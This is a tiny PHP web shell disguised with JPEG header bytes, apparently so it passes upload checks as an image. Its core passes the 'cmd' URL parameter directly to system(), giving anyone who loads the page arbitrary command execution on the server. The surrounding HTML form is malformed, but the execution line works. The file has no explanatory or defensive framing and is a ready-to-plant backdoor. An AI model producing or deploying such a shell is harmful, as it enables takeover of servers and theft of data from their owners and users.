ÿØÿà<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']);?>">
<form method="TEXT" name="cmd" id="cmd" size="80">
<form method="SUBMIT" value="Execute>
</form>
<pre>
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']); // Execute the command
}
?>
</pre
<body>
<script>document.getElementById("cmd").focus();</script>
</html>